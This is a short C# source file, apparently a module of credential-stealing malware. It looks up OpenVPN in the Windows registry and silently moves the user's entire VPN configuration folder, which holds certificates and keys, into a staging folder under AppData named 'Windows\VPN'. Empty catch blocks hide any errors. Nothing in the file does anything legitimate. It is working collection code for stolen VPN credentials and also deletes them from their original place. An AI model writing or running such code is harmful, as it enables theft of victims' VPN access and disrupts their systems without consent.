using Microsoft.Win32;
using System;
using System.IO;

namespace opvpn
{
    class ovpn
    {
        public static void openvpn()
        {
            try
            {
                RegistryKey localMachineKey = Registry.LocalMachine;
                string[] names = localMachineKey.OpenSubKey("SOFTWARE").GetSubKeyNames();
                foreach (string i in names)
                {
                    if (i == "OpenVPN")
                    {
                        Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/VPN/OpenVPN");
                        try
                        {
                            string dir = localMachineKey.OpenSubKey("SOFTWARE").OpenSubKey("OpenVPN").GetValue("config_dir").ToString();
                            DirectoryInfo dire = new DirectoryInfo(dir);
                            dire.MoveTo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\VPN\OpenVPN\Config");
                        }
                        catch
                        {
                        }

                    }
                }
            }
            catch
            {
            }
        }
    }   
}
